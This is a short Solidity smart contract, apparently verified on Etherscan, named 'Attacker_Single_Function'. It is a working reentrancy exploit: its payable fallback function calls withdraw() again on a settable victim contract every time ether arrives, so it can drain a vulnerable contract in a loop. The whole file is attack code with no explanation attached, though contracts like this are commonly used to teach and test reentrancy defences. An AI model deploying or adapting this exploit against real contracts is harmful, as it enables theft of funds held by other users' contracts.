/**
 *Submitted for verification at Etherscan.io on 2022-07-30
*/

pragma solidity 0.5.10;

interface attackinterface{
	function withdraw() external returns(bool);
}
contract Attacker_Single_Function{
	
	address public victimContractAddress;
	
	function () external payable{
		//if(victimContractAddress.balance > 0.1 ) attackinterface(victimContractAddress).withdraw();
		attackinterface(victimContractAddress).withdraw();
	}
	function AttackingWithdraw() public returns(bool){
		attackinterface(victimContractAddress).withdraw();
		return true;
	}
	function UpdateVictimAddress(address _victim) public returns(bool){
		victimContractAddress = _victim;
		return true;
	}
	
}